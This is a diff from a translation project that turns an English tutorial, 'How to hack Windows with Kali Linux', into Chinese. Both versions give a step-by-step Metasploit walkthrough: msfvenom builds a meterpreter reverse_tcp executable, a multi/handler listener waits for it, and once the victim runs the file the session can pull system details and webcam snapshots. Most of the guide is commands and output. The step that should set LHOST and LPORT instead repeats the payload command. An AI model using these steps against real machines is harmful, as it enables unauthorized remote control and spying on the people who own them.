@@ -1,11 +1,10 @@
-GHLandy Translating
+快速指南：如何使用 Kali Linux 黑掉 Windows
+====================
 
-Quick Guide: How To hack windows with Kali Linux
-============================================================
+Kali Linux 源自于 Debian Linux，主要用于渗透测试，拥有超过 300 套的预安装渗透测试工具。Metasploit 项目中 Metasploit 框架支持 Kali Linux 平台，Metasploit 是一个用于开发和执行安全 exploit 代码的工具。让我们来使用 Kali Linux 来攻破 Windows 吧。请注意，我写这篇文章只是出于教育目的哦。
 
-Kali Linux is derived from Debian Linux flavor and its mainly used for penetration tasting. It has more than 300 pre-installed  penetration-testing programs. It is a supported platform of the Metasploit Project’s Metasploit Framework, a tool for developing and executing security exploits. Let begin with hack windows with Kali Linux.Kindly note that , I am writing this post for education purpose only.
 
-Source machine details:
+源机器详情：
 
 Kali Linux
 
@@ -15,16 +14,15 @@ Linux kali 4.6.0-kali1-amd64 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/
 root@kali:/#
 ```
 
-Target machine used for hacking:
-
+用做攻击对象的目标机器：
 
 ```
-Windows 7 Ultimate SP1 
+Windows 7 Ultimate SP1
 ```
 
-Step 1\. Create Payload
+步骤 1：创建 Payload 程序
 
-Payload is a program which is similar as a virus or trojan which get executed on the remote machine for hacking purpose. To create payload program use below command which will hack windows with Kali Linux.
+Payload 是一个类似于病毒 (virus) 或者木马 (trojan) 的程序，可以运行在远程目标上 —— 为了黑掉那台机器。可以通过以下命令来创建 Payload，以便能使用 Kali Linux 黑掉 Windows。
 
 ```
 root@kali:/# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.189.128 LPORT=4444 --format=exe -o /root/program.exe
@@ -38,9 +36,9 @@ root@kali:/# ls -la /root/program.exe
 -rw-r--r-- 1 root root 73802 Jan 26 00:46 /root/program.exe
 ```
 
-With ls command we have confirmed that our Payload program is successfully created at the given location.
+通过 'ls' 命令，我们可以确认 Payload 程序是否成功生成在指定的位置。
 
-Step 2: Run mfsconsole command which will start msf prompt.
+步骤 2：运行 mfsconsole 命令启动 msf 命令窗口
 
 ```
 root@kali:# msfconsole
@@ -79,11 +77,10 @@ your progress and findings -- learn more on http://rapid7.com/metasploit
 msf >
 ```
 
+步骤 3：我使用一下细节进行漏洞利用 (exploiting)
 
-Step 3:  For exploiting I have used following details:
-
-*   Port 4444: you can use as per your choice
-*   LHOST IP: which is nothing but the Kali Linux machines IP 192.168.189.128\. to Know ip of your kali machine use below command.
+* 4444 端口：你可用按照自己的心意来使用哪个端口
+* LHOST IP：表示 Kali Linux 机器的IP 192.168.189.128\. 使用如下命令来查看你的 Kali Linux 机器的 IP。
 
 ```
 root@kali:/# ip r l
@@ -91,30 +88,27 @@ root@kali:/# ip r l
 root@kali:/#
 ```
 
-
-Now give following command at msf prompt “use exploit/multi/handler”
+现在在 msf 命令窗口使用 “use exploit/multi/handler” 命令，如下：
 
 ```
 msf > use exploit/multi/handler
 msf exploit(handler) >
 ```
 
-Then give command “set payload windows/meterpreter/reverse_tcp” at the next prompt:
+然后在接下来的命令窗口中使用命令 “set payload windows/meterpreter/reverse_tcp”：
+```
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+```
+
+现在使用 LHOST 和 LPORT 来存储本地 IP 和本地端口，如下：
 
 ```
 msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
 payload => windows/meterpreter/reverse_tcp
 ```
 
-
-Now set local IP and port using LHOST and LPORT command as below:
-
-```
-msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
-payload => windows/meterpreter/reverse_tcp
-```
-
-and finally give exploit command.
+最后使用 exploit 命令。
 
 ```
 msf exploit(handler) > exploit
@@ -123,7 +117,7 @@ msf exploit(handler) > exploit
 [*] Starting the payload handler...
 ```
 
-Now you need to execute the “program.exe” on the windows machine once its executed on target machine , you can able to establish a meterpreter session. Just type sysinfo to get the details hacked windows machine.
+现在你需要在 Windows 上运行 “program.exe”，一旦他在目标机器上执行，你就可以建立一个 meterpreter 会话。输入 sysinfo 就可以得到被黑掉的 Windows 机器详情。
 
 ```
 msf exploit(handler) > exploit
@@ -143,15 +137,20 @@ Logged On Users : 2
 Meterpreter     : x86/win32
 ```
 
+一旦你得到了这下详细信息，就可以做更多的漏洞利用，或者通过 “help” 命令获取更多信息，以便列出所有你可以黑掉该系统的选项，比如 “webcam_snap” 命令获取网络摄像头，同样你还可以使用其他更多的可用选项。祝你入侵愉快！！！！
 
-Once you successfully get this details you can do more exploit or get more information using “help” command which will show all the options by which you can hack the system e.g. to get the webcam snap use command “webcam_snap” same way you can use many available option available. Happy hacking!!!!
+------------------------------------
 
---------------------------------------------------------------------------------
+译者简介：
+
+[GHLandy](http://GHLandy.com) —— 划不完粉腮柳眉泣别离。
+
+------------------------------------
 
 via: http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/
 
 作者：[Manmohan Mirkar][a]
-译者：[译者ID](https://github.com/译者ID)
+译者：[GHLandy](https://github.com/GHLandy)
 校对：[校对者ID](https://github.com/校对者ID)
 
 本文由 [LCTT](https://github.com/LCTT/TranslateProject) 原创编译，[Linux中国](https://linux.cn/) 荣誉推出
